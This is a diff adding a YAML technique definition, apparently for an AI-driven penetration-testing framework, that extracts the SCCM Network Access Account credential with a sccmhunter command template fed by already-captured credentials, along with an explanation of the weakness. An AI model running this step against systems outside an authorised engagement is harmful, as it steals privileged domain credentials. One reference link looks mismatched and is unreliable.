@@ -1,0 +1,35 @@
+name: sccm_naa_extract
+category: sccm
+description: SCCM CRED-2 — extract Network Access Account from client policy
+preconditions:
+- has_cred
+- sccm_mp_identified
+parameters:
+  mp_hostname: from_engagement.mp_hostname
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+  site_code: from_engagement.sccm_site_code
+command_template: sccmhunter http -u {username} -p '{password}' -d {domain} -tm {mp_hostname}
+  -sc {site_code}
+parser: generic_parser
+expected_effects:
+- sccm_naa_obtained
+- naa_extracted
+- has_cred
+falsifier:
+  pattern: ACCESS_DENIED|policy not found|no NAA configured
+  timeout: 120
+model_tier: sonnet
+mechanism: 'Any domain user can register as a client, request policy from MP, and
+  read
+
+  the encrypted NAA blob. Decryption key is stored in the policy itself (pre-TP2207)
+
+  or derivable from DPAPI with NetworkService. NAA is often highly-privileged.
+
+  '
+references:
+  ocd_mindmap: 'Branch 12: SCCM CRED-2 (NAA from policy)'
+  hacktricks: windows-hardening/active-directory-methodology/pentesting-sccm.md
+hacktricks_ref: generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md
